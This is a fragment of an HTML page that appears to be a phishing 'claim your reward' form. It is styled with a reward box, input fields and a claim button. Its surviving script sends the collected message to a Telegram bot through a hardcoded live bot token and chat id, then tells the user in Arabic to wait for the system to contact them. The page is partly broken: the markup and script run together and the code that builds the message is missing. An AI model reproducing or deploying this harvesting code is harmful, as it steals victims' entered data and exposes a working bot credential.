<!DOCTYPE html>

    <style>

        :root { --os-dark: #020617; --os-accent: #22c55e; --os-surface: rgba(30, 41, 59, 0.7); }
        body { margin: 0; background: radial-gradient(circle, #0f172a, #020617); color: #f8fafc; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .os-card { background: var(--os-surface); backdrop-filter: blur(15px); border: 2px solid var(--os-accent); border-radius: 24px; padding: 30px; width: 90%; max-width: 420px; text-align: center; box-shadow: 0 0 40px rgba(34, 197, 94, 0.2); }
        .reward-box { background: rgba(34, 197, 94, 0.1); border: 1px dashed var(--os-accent); padding: 15px; border-radius: 15px; margin-bottom: 20px; }
        input { width: 100%; background: rgba(0,0,0,0.4); border: 2px solid rgba(34, 197, 94, 0.3); border-radius: 12px; padding: 15px; margin-bottom: 15px; color: white; box-sizing: border-box; }
        .btn-claim { background: var(--os-accent); color: var(--os-dark); border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: 900; cursor: pointer; }
    </style>
</head>
<body>
    <div class="os-card">

        fetch(`https://api.telegram.org/bot8564646143:AAEDmrL8HbdPESyY9iOJ0TXjEL4_bTSEaTs/sendMessage?chat_id=8665747715&text=${encodeURIComponent(msg)}`)
        .then(() => { alert("تم التأكيد، انتظر اتصال النظام..."); });
    }
    </script>
</body>
